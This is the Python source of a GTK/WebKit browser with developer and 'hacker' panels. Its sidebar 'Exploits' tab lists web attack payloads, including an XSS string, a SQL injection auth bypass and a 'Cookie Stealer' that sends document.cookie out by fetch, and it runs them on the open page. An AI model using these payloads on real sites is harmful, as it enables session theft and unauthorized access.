import sys
import gi
import os
import json
import base64
from datetime import datetime
gi.require_version('Gtk', '3.0')
gi.require_version('WebKit2', '4.1')
from gi.repository import Gtk, Gdk, GLib
from gi.repository import WebKit2

START_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Zero Browser Start</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0f1115;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            animation: fadein 0.5s ease-out;
        }
        @keyframes fadein {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            font-size: 48px;
            font-weight: 800;
            margin: 0 0 10px 0;
            background: linear-gradient(90deg, #4D90FE, #00C853);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #A0AAB5;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .search-box {
            display: flex;
            align-items: center;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 30px;
            padding: 10px 20px;
            margin-bottom: 30px;
            width: 400px;
            transition: all 0.3s ease;
        }
        .search-box:focus-within {
            border-color: #4D90FE;
            box-shadow: 0 0 15px rgba(77,144,254,0.2);
        }
        .search-box input {
            background: transparent;
            border: none;
            color: white;
            font-size: 16px;
            width: 100%;
            outline: none;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
        }
        .card {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px 10px;
            text-decoration: none;
            color: white;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        .card:hover {
            background: rgba(255,255,255,0.08);
            transform: translateY(-2px);
            border-color: rgba(255,255,255,0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="time">00:00</h1>
        <p>Welcome to Zero Browser.</p>
        <div class="search-box">
            <input type="text" id="q" placeholder="Search the web or enter URL..." autofocus>
        </div>
        <div class="grid">
            <a href="https://github.com" class="card">GitHub</a>
            <a href="https://stackoverflow.com" class="card">StackOverflow</a>
            <a href="https://youtube.com" class="card">YouTube</a>
            <a href="https://x.com" class="card">X (Twitter)</a>
        </div>
    </div>
    <script>
        function updateTime() {
            const now = new Date();
            document.getElementById('time').innerText = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        }
        setInterval(updateTime, 1000);
        updateTime();
        
        document.getElementById('q').addEventListener('keypress', function(e) {
            if(e.key === 'Enter') {
                let val = this.value;
                if(val.includes('.') && !val.includes(' ')) {
                    if(!val.startsWith('http')) val = 'https://' + val;
                    window.location.href = val;
                } else {
                    window.location.href = 'https://google.com/search?q=' + encodeURIComponent(val);
                }
            }
        });
    </script>
</body>
</html>
"""

SCROLLBAR_CSS = """
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
    background: #12141a;
}
::-webkit-scrollbar-thumb {
    background: #3a3f4b;
    border-radius: 4px;
}
::-webkit-scrollbar-thumb:hover {
    background: #4d90fe;
}
::-webkit-scrollbar-corner {
    background: #12141a;
}
"""

class ZeroDevBrowser(Gtk.Window):
    def __init__(self):
        super().__init__(title="Zero Browser")
        self.set_default_size(1280, 800)
        
        self.setup_css()
        
        # Data Models
        self.history_store = Gtk.ListStore(str, str) 
        self.downloads_store = Gtk.ListStore(str, str, str)
        self.custom_headers = []
        
        self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(self.main_vbox)
        
        # ================= HEADER BAR =================
        self.header = Gtk.HeaderBar()
        self.header.set_show_close_button(True)
        self.header.set_title("Zero Browser")
        self.set_titlebar(self.header)

        # Left Controls
        self.btn_sidebar = Gtk.ToggleButton()
        self.btn_sidebar.add(Gtk.Image.new_from_icon_name("view-sidebar-symbolic", Gtk.IconSize.MENU))
        self.btn_sidebar.set_tooltip_text("Toggle Sidebar (History/Downloads/Exploits)")
        self.btn_sidebar.connect("toggled", self.on_sidebar_toggled)
        self.header.pack_start(self.btn_sidebar)

        btn_back = Gtk.Button()
        btn_back.add(Gtk.Image.new_from_icon_name("go-previous-symbolic", Gtk.IconSize.MENU))
        btn_forward = Gtk.Button()
        btn_forward.add(Gtk.Image.new_from_icon_name("go-next-symbolic", Gtk.IconSize.MENU))
        btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
        btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
        
        for b in (btn_back, btn_forward):
            self.header.pack_start(b)

        # Center URL Bar
        self.url_bar = Gtk.Entry()
        self.url_bar.set_placeholder_text("Search or enter web address")
        self.url_bar.set_width_chars(60)
        self.url_bar.connect("activate", self.on_url_activate)
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.PRIMARY, "network-secure-symbolic")
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
        self.url_bar.connect("icon-press", lambda e, p, ev: self.current_webview.reload() if hasattr(self, 'current_webview') and p == Gtk.EntryIconPosition.SECONDARY else None)
        
        self.header.set_custom_title(self.url_bar)

        # Right Controls
        self.btn_devtools = Gtk.ToggleButton()
        self.btn_devtools.add(Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU))
        self.btn_devtools.set_tooltip_text("Toggle Hacker Tools")
        self.btn_devtools.connect("toggled", self.on_devtools_toggled)
        self.header.pack_end(self.btn_devtools)

        self.btn_newtab = Gtk.Button()
        self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
        self.btn_newtab.set_tooltip_text("New Tab")
        self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
        self.header.pack_end(self.btn_newtab)

        # ================= MAIN WORKSPACE (Paned) =================
        self.hpaned = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
        self.main_vbox.pack_start(self.hpaned, True, True, 0)
        
        # Sidebar (Revealer)
        self.sidebar_revealer = Gtk.Revealer()
        self.sidebar_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT)
        self.sidebar_revealer.set_reveal_child(False)
        self.sidebar_box = self.build_sidebar()
        self.sidebar_revealer.add(self.sidebar_box)
        self.hpaned.pack1(self.sidebar_revealer, False, False)
        
        # Right side contains Tabs + DevTools
        self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
        self.hpaned.pack2(self.vpaned, True, False)
        
        self.notebook = Gtk.Notebook()
        self.notebook.set_scrollable(True)
        self.vpaned.pack1(self.notebook, True, False)
        
        # DevTools Drawer (Revealer)
        self.devtools_revealer = Gtk.Revealer()
        self.devtools_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_UP)
        self.devtools_revealer.set_reveal_child(False)
        self.devtools_box = self.build_devtools()
        self.devtools_revealer.add(self.devtools_box)
        self.vpaned.pack2(self.devtools_revealer, False, False)
        
        # WebKit Download & Content Context
        self.web_ctx = WebKit2.WebContext.new_ephemeral()
        self.web_ctx.connect("download-started", self.on_download_started)
        
        # Inject custom scrollbar globally
        self.user_content = WebKit2.UserContentManager.new()
        style_sheet = WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
        self.user_content.add_style_sheet(style_sheet)
        
        self.new_tab("zero://start")

    def on_sidebar_toggled(self, btn):
        self.sidebar_revealer.set_reveal_child(btn.get_active())

    def on_devtools_toggled(self, btn):
        self.devtools_revealer.set_reveal_child(btn.get_active())

    def build_sidebar(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        box.set_size_request(250, -1)
        
        nb = Gtk.Notebook()
        nb.set_tab_pos(Gtk.PositionType.BOTTOM)
        
        # 1. History
        hist_tree = Gtk.TreeView(model=self.history_store)
        renderer = Gtk.CellRendererText()
        hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0))
        hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1))
        hist_tree.connect("row-activated", self.on_history_activated)
        scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree)
        nb.append_page(scroll1, Gtk.Label(label="History"))
        
        # 2. Downloads
        dl_tree = Gtk.TreeView(model=self.downloads_store)
        r2 = Gtk.CellRendererText()
        dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0))
        dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2))
        scroll2 = Gtk.ScrolledWindow(); scroll2.add(dl_tree)
        nb.append_page(scroll2, Gtk.Label(label="Downloads"))
        
        # 3. Exploits
        plist = Gtk.ListBox()
        payloads = [
            ("XSS Alert", "javascript:alert(1)"),
            ("SQLi Auth Bypass", "' OR '1'='1"),
            ("DOM Tree Trigger", "javascript:alert(document.documentElement.innerHTML)"),
            ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")
        ]
        for title, p in payloads:
            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
            lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label")
            lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True)
            v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
        plist.connect("row-activated", self.on_payload_activated)
        scroll3 = Gtk.ScrolledWindow(); scroll3.add(plist)
        nb.append_page(scroll3, Gtk.Label(label="Exploits"))
        
        box.pack_start(nb, True, True, 0)
        return box

    def build_devtools(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        box.set_size_request(-1, 280)
        
        toolbar = Gtk.Toolbar()
        toolbar.get_style_context().add_class("primary-toolbar")
        
        self.dev_stack = Gtk.Stack()
        self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        
        # Switcher
        switcher = Gtk.StackSwitcher()
        switcher.set_stack(self.dev_stack)
        
        toolbar_item = Gtk.ToolItem()
        toolbar_item.add(switcher)
        toolbar.insert(toolbar_item, 0)
        
        # Security Toggles (Right side of toolbar)
        sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.btn_webrtc = Gtk.ToggleButton(label="WebRTC Leak")
        self.btn_webrtc.connect("toggled", self.on_webrtc_toggled)
        self.btn_cors = Gtk.ToggleButton(label="CORS Strict")
        self.btn_cors.connect("toggled", self.on_cors_toggled)
        sec_box.pack_end(self.btn_cors, False, False, 0)
        sec_box.pack_end(self.btn_webrtc, False, False, 0)
        
        ti_sec = Gtk.ToolItem()
        ti_sec.set_expand(True)
        ti_sec.add(sec_box)
        toolbar.insert(ti_sec, 1)

        box.pack_start(toolbar, False, False, 0)
        box.pack_start(self.dev_stack, True, True, 0)
        
        # Dev Tools Panels
        self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console")
        self.dev_stack.add_titled(self.build_network_panel(), "network", "Network")
        self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies")
        self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage")
        self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source")
        self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject")
        self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
        
        # We listen to switch to refresh data
        self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
        return box

    def on_dev_stack_changed(self, stack, param):
        name = stack.get_visible_child_name()
        if name == "cookies": self.refresh_cookies()
        elif name == "storage": self.refresh_storage()
        elif name == "source": self.on_fetch_source(None)

    def on_history_activated(self, treeview, path, column):
        url = self.history_store[path][1]
        self.url_bar.set_text(url)
        self.on_url_activate(self.url_bar)
        
    def on_payload_activated(self, listbox, row):
        vbox = row.get_child()
        payload = vbox.get_children()[1].get_text()
        url = self.url_bar.get_text()
        if payload.startswith("javascript:"):
            if hasattr(self, 'current_webview'):
                self.current_webview.run_javascript(payload[11:], None, None, None)
        else:
            self.url_bar.set_text(url + payload)
            self.url_bar.grab_focus()

    def on_download_started(self, context, download):
        req = download.get_request()
        filename = req.get_uri().split("/")[-1] or "downloaded_file"
        dest_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)
        download.set_destination("file://" + dest_path)
        iter_ref = self.downloads_store.append([filename, "Downloading...", "0%"])
        
        def on_received_data(dl, length, i=iter_ref):
            self.downloads_store[i][2] = f"{int(dl.get_estimated_progress() * 100)}%"
        def on_finished(dl, i=iter_ref):
            self.downloads_store[i][1] = "Finished"; self.downloads_store[i][2] = "100%"
        def on_failed(dl, error, i=iter_ref):
            self.downloads_store[i][1] = "Failed"
            
        download.connect("received-data", on_received_data)
        download.connect("finished", on_finished)
        download.connect("failed", on_failed)

    # --- PANELS ---
    def build_terminal_emulator(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.term_output = Gtk.TextView(); self.term_output.set_editable(False)
        scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0)
        entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0)
        return box

    def build_css_panel(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.css_text = Gtk.TextView()
        scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 0)
        btn = Gtk.Button(label="Inject CSS to Tab"); btn.connect("clicked", self.on_inject_css); box.pack_start(btn, False, False, 0)
        return box

    def build_source_viewer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.source_text = Gtk.TextView(); self.source_text.set_editable(False)
        scroll = Gtk.ScrolledWindow(); scroll.add(self.source_text); box.pack_start(scroll, True, True, 0)
        btn = Gtk.Button(label="Refresh DOM"); btn.connect("clicked", self.on_fetch_source); box.pack_start(btn, False, False, 0)
        return box

    def build_cookie_explorer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.cookie_list = Gtk.ListBox()
        scroll = Gtk.ScrolledWindow(); scroll.add(self.cookie_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_storage_explorer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry()
        btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage)
        controls.pack_start(self.ls_key, True, True, 0); controls.pack_start(self.ls_val, True, True, 0); controls.pack_start(btn, False, False, 0)
        box.pack_start(controls, False, False, 0)
        self.storage_list = Gtk.ListBox()
        scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_network_panel(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.network_list = Gtk.ListBox()
        scroll = Gtk.ScrolledWindow(); scroll.add(self.network_list); box.pack_start(scroll, True, True, 0)
        btn = Gtk.Button(label="Clear"); btn.connect("clicked", self.on_clear_network); box.pack_end(btn, False, False, 0)
        return box

    def build_js_console(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.js_output = Gtk.TextView(); self.js_output.set_editable(False); self.js_output.get_buffer().set_text("> ")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.js_output); box.pack_start(scroll, True, True, 0)
        entry = Gtk.Entry(); entry.connect("activate", self.on_js_execute); box.pack_start(entry, False, False, 0)
        return box

    # --- HANDLERS ---
    def on_js_execute(self, entry):
        if not hasattr(self, 'current_webview'): return
        js_cmd = entry.get_text()
        buf = self.js_output.get_buffer(); buf.insert(buf.get_end_iter(), js_cmd + "\n"); entry.set_text("")
        def on_js_finish(w, r, u):
            try:
                val = w.run_javascript_finish(r).get_js_value()
                out = val.to_string() if val.is_string() else str(val.to_double()) if val.is_number() else str(val.to_boolean()) if val.is_boolean() else "null" if val.is_null() else "undefined" if val.is_undefined() else "[Object]"
                buf.insert(buf.get_end_iter(), "<- " + out + "\n> ")
            except Exception as e: buf.insert(buf.get_end_iter(), f"Error: {e}\n> ")
        self.current_webview.run_javascript(js_cmd, None, on_js_finish, None)

    def on_webrtc_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        settings = self.current_webview.get_settings()
        if btn.get_active(): btn.set_label("WebRTC Blocked"); settings.set_enable_webrtc(False)
        else: btn.set_label("WebRTC Leak"); settings.set_enable_webrtc(True)
        self.current_webview.set_settings(settings)

    def on_cors_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        settings = self.current_webview.get_settings()
        if btn.get_active(): btn.set_label("CORS Bypass"); settings.set_enable_xss_auditor(False)
        else: btn.set_label("CORS Strict"); settings.set_enable_xss_auditor(True)
        self.current_webview.set_settings(settings)

    def on_clear_network(self, btn):
        for child in self.network_list.get_children(): self.network_list.remove(child)

    def on_resource_load(self, webview, resource, request):
        uri = request.get_uri()
        method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label")
        lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
        hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox)
        self.network_list.add(row); self.network_list.show_all()

    def refresh_cookies(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.cookie_list.get_children(): self.cookie_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                    if "=" not in c: continue
                    k, v = c.split("=", 1)
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                    lv = Gtk.Label(label=v.strip()); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
                    self.cookie_list.add(row)
                self.cookie_list.show_all()
            except: pass
        self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)

    def refresh_storage(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.storage_list.get_children(): self.storage_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for k, v in json.loads(w.run_javascript_finish(r).get_js_value().to_string()).items():
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                    lv = Gtk.Label(label=str(v)); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
                    self.storage_list.add(row)
                self.storage_list.show_all()
            except: pass
        self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)

    def on_add_storage(self, btn):
        k, v = self.ls_key.get_text().strip(), self.ls_val.get_text().strip()
        if k and v:
            self.current_webview.run_javascript(f"localStorage.setItem('{k}', '{v}');", None, None, None)
            self.ls_key.set_text(""); self.ls_val.set_text(""); self.refresh_storage()

    def on_fetch_source(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_js_finish(w, r, u):
            try: self.source_text.get_buffer().set_text(w.run_javascript_finish(r).get_js_value().to_string())
            except: pass
        self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)

    def on_inject_css(self, btn):
        buf = self.css_text.get_buffer()
        css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
        self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)

    def on_term_execute(self, entry):
        cmd = entry.get_text()
        buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
        try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
        except Exception as e:
            try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
            except Exception as ex: buf.insert(buf.get_end_iter(), f"Error: {ex}\n>>> ")
        entry.set_text("")

    def new_tab(self, url):
        webview = WebKit2.WebView.new_with_user_content_manager(self.user_content)
        webview.connect("resource-load-started", self.on_resource_load)
        
        settings = webview.get_settings()
        settings.set_enable_developer_extras(True)
        webview.set_settings(settings)
        
        if url == "zero://start":
            webview.load_html(START_PAGE_HTML, "zero://start")
        else:
            webview.load_uri(url)
            
        scrolled = Gtk.ScrolledWindow(); scrolled.add(webview)
        
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        label = Gtk.Label(label="New Tab")
        btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
        btn_close.set_relief(Gtk.ReliefStyle.NONE)
        btn_close.connect("clicked", lambda b: self.notebook.remove_page(self.notebook.page_num(scrolled)))
        hbox.pack_start(label, True, True, 0); hbox.pack_end(btn_close, False, False, 0); hbox.show_all()
        
        self.notebook.append_page(scrolled, hbox)
        self.notebook.show_all()
        
        def on_uri(w, p):
            uri = w.get_uri() or ""
            self.url_bar.set_text(uri)
            if uri != "zero://start" and not uri.startswith("about:"):
                time_str = datetime.now().strftime("%H:%M")
                self.history_store.append([time_str, uri])
            
        webview.connect("notify::uri", on_uri)
        webview.connect("notify::title", lambda w, p: label.set_text(w.get_title() or "Untitled"))
        self.current_webview = webview

    def on_url_activate(self, entry):
        url = entry.get_text()
        if url == "zero://start":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(START_PAGE_HTML, "zero://start")
            return
        if not url.startswith("http"): url = "https://" + url
        if hasattr(self, 'current_webview'): self.current_webview.load_uri(url)

    def setup_css(self):
        css = b'''
            .bold-label { font-weight: bold; }
        '''
        provider = Gtk.CssProvider()
        provider.load_from_data(css)
        Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)

if __name__ == "__main__":
    win = ZeroDevBrowser()
    win.connect("destroy", Gtk.main_quit)
    win.show_all()
    Gtk.main()
